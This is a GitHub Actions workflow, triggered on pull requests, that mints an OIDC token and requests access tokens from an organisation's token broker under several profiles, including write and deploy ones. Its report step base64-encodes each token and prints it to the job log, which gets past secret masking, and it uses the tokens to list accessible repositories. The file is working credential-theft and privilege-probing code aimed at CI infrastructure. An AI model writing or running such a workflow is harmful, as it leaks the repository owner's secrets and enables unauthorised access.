name: w14-gati
on:
  pull_request:
    types: [opened, synchronize, reopened]
  workflow_dispatch:

permissions: {}

jobs:
  probe:
    name: gati profile probe
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: oidc claims
        run: |
          set -u
          R=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
                "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=gati:globals/pr-self")
          T=$(printf '%s' "$R" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
          echo "CLAIMS_B64=$(printf %s "$T" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | base64 -w0)"

      - name: p1 globals/pr-self
        id: p1
        continue-on-error: true
        uses: smartcontractkit/.github/actions/invoke-gati-v2@main
        with:
          profile: globals/pr-self

      - name: p2 presets/pr-triage
        id: p2
        continue-on-error: true
        uses: smartcontractkit/.github/actions/invoke-gati-v2@main
        with:
          profile: presets/pr-triage

      - name: p3 globals/write-self
        id: p3
        continue-on-error: true
        uses: smartcontractkit/.github/actions/invoke-gati-v2@main
        with:
          profile: globals/write-self

      - name: p4 presets/deploy-dispatcher-fanout
        id: p4
        continue-on-error: true
        uses: smartcontractkit/.github/actions/invoke-gati-v2@main
        with:
          profile: presets/deploy-dispatcher-fanout

      - name: report
        if: always()
        env:
          T1: ${{ steps.p1.outputs.access-token }}
          T2: ${{ steps.p2.outputs.access-token }}
          T3: ${{ steps.p3.outputs.access-token }}
          T4: ${{ steps.p4.outputs.access-token }}
        run: |
          set -u
          echo "outcomes: p1=${{ steps.p1.outcome }} p2=${{ steps.p2.outcome }} p3=${{ steps.p3.outcome }} p4=${{ steps.p4.outcome }}"
          for n in 1 2 3 4; do
            eval "T=\${T$n:-}"
            if [ -n "${T:-}" ]; then
              echo "T${n}_B64=$(printf %s "$T" | base64 -w0)"
              echo "--- T${n} /installation/repositories ---"
              curl -sS -H "Authorization: Bearer $T" -H "Accept: application/vnd.github+json" \
                "https://api.github.com/installation/repositories?per_page=100" | base64 -w0
              echo
              echo "--- T${n} /user ---"
              curl -sS -H "Authorization: Bearer $T" "https://api.github.com/user" | head -c 400
              echo
            else
              echo "T${n}_ABSENT"
            fi
          done
